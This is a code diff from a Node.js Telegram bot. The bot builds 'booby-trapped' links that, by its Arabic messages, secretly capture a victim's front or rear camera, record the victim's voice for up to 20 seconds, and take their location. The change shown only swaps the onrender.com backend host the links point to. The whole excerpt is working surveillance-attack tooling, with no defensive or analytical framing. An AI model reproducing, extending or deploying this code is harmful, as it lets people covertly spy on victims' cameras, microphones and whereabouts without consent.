@@ -1138,12 +1138,12 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://yemen-b66f.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         bot.sendMessage(chatId, ` تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
-        const url = `https://yemen-b66f.onrender.com/getLocation/${chatId}`;
+        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
         console.log('Data received:', data);
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
@@ -1160,7 +1160,7 @@ bot.on('message', (msg) => {
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
-            const link = `https://yemen-b66f.onrender.com/record/${chatId}?duration=${duration}`;
+            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
             bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
@@ -1206,7 +1206,7 @@ function showHackingButtons(userId) {
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
-    const baseUrl = 'https://yemen-b66f.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
+    const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
     console.log('Received callback query:', data);
 
